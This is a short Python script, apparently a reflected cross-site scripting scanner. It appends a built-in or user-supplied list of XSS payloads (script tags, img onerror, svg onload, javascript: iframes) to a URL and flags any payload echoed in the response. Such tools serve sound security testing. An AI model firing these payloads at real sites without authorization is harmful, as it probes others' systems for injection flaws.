import requests
import os
from colorama import Fore, Style

def xss_test(url, payload_file=None):
    # Default payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ]

    # If user provides file, load payloads from file
    if payload_file:
        if os.path.isfile(payload_file):
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
        else:
            print(f"{Fore.RED}[!] File not found: {payload_file}{Style.RESET_ALL}")
            return

    print(f"\n{Fore.YELLOW}Starting XSS Payload Testing...{Style.RESET_ALL}")

    found = False
    for payload in payloads:
        full_url = url + payload
        try:
            response = requests.get(full_url, timeout=5)
            if payload in response.text:
                print(f"{Fore.RED}[+] Possible XSS detected!{Style.RESET_ALL}")
                print(f"{Fore.RED}Payload: {payload}{Style.RESET_ALL}")
                print(f"{Fore.RED}URL: {full_url}{Style.RESET_ALL}\n")
                found = True
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")

    if not found:
        print(f"{Fore.RED}[-] No XSS vulnerability detected.{Style.RESET_ALL}")

# Example usage
#xss_test("http://example.com")

# 